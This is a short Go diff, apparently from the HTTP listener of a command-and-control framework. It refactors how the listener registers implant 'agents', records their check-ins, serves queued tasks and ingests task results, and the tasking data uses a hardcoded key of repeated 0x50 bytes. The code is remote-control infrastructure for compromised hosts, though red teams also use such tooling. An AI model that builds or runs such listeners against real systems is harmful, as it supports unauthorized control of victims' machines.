@@ -257,10 +257,10 @@ func (handler *HTTP) processRequest(ctx *gin.Context) {
 	}
 	oldAgentId = string(oldUID[:8])
 
-	if !ModuleObject.ts.TsAgentIsExists(oldAgentId) {
+	if !Ts.TsAgentIsExists(oldAgentId) {
 		fmt.Printf("[INFO] Creating new agent: %s\n", oldAgentId)
 
-		agentData, err := ModuleObject.ts.TsAgentCreate(agentType, oldAgentId, bodyData, handler.Name, ExternalIP, true)
+		agentData, err := Ts.TsAgentCreate(agentType, oldAgentId, bodyData, handler.Name, ExternalIP, true)
 		if err != nil {
 			fmt.Printf("[ERROR] Failed to create agent: %v\n", err)
 			goto ERR
@@ -279,10 +279,10 @@ func (handler *HTTP) processRequest(ctx *gin.Context) {
 	} else if len(bodyData) > 0 {
 		fmt.Printf("[INFO] Processing data for existing agent: %s\n", oldAgentId)
 
-		_ = ModuleObject.ts.TsAgentSetTick(oldAgentId)
+		_ = Ts.TsAgentSetTick(oldAgentId, handler.Name)
 
 		if bodyData[0] == 0 { // Get Tasks
-			hostedData, err := ModuleObject.ts.TsAgentGetHostedAll(oldAgentId, 0x12c0000) // 25 Mb * 0,75 for base64
+			hostedData, err := Ts.TsAgentGetHostedAll(oldAgentId, 0x12c0000) // 25 Mb * 0,75 for base64
 			if len(hostedData) > 0 {
 
 				key := bytes.Repeat([]byte{0x50}, 16)
@@ -296,11 +296,11 @@ func (handler *HTTP) processRequest(ctx *gin.Context) {
 			}
 		} else if bodyData[0] == 1 { // Tasks result
 
-			_ = ModuleObject.ts.TsAgentProcessData(oldAgentId, bodyData[1:])
+			_ = Ts.TsAgentProcessData(oldAgentId, bodyData[1:])
 
 		} else if bodyData[0] == 5 || bodyData[0] == 7 { // QuickMsg || QuickOut
 
-			_ = ModuleObject.ts.TsAgentProcessData(oldAgentId, append([]byte{0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0}, bodyData...))
+			_ = Ts.TsAgentProcessData(oldAgentId, append([]byte{0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0}, bodyData...))
 
 		} else {
 			fmt.Printf("[WARN] Unknown body data type: %d\n", bodyData[0])
